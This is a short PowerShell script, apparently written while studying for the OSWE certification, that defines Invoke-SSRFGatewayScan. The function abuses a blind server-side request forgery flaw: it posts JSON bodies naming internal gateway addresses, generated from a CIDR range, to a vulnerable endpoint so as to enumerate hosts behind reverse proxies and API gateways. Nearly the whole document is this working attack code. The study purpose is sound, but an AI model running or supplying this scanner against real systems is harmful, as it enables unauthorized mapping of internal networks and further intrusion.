<#
.SYNOPSIS
  This is a simple template script for gateway detection on an internal network via blind SSRF.
.Description
  This script enumerates hosts on the local intranet behind reverse proxies/apigateways.
.PARAMETER Target
  A full uri that we want to scan for.
.PARAMETER Port
  The port we expect to find a gateway on.
.PARAMETER NetworkAddress
  A valid network address in CIDR format to generate gateways from.
.PARAMETER Timeout
  Number of seconds before moving onto the next address.
.PARAMETER Live
  Defaults to true, will only show alive gateways ports. Setting this to false will show gateways.
.OUTPUTS
  Returns PSCustomObject with the corresponding port and response object
.NOTES
  Version:        1.0
  Author:         Zinhart
  Purpose/Change: Created while studying for OSWE certification
.EXAMPLE
  If we wanted to scan for only 172.16.16.1:8000
  PS> Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -Port 8000 -NetworkAddress '172.16.16.1/31'
#>
function Invoke-SSRFGatewayScan() {
  [cmdletbinding()]
  param(
  [Parameter(Mandatory=$true, HelpMessage='The target URI')]
  [string]$Target,
  [Parameter(Mandatory=$false, HelpMessage='The port we expect to find a gateway on.')]
  [string]$Port="80",
  [Parameter(Mandatory=$True, HelpMessage='A valid network address in CIDR format to generate gateways from.')]
  [string]$NetworkAddress,
  [Parameter(Mandatory=$false, HelpMessage='Number of seconds before moving onto the next port')]
  [int]$Timeout = 5,
  [Parameter(Mandatory=$false, HelpMessage='Show Only Open ports')]
  [switch]$Live
  )

  $gateways = (./Convert-CIDRInfo.ps1 -NetworkAddress $NetworkAddress -Gateway).GatewaysEnumerated
  foreach ($gateway in $gateways) {
    $json = @{"url" = "http://"+ $gateway + ":" + $Port} | ConvertTo-Json
    $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
    Write-Output $res
  }

}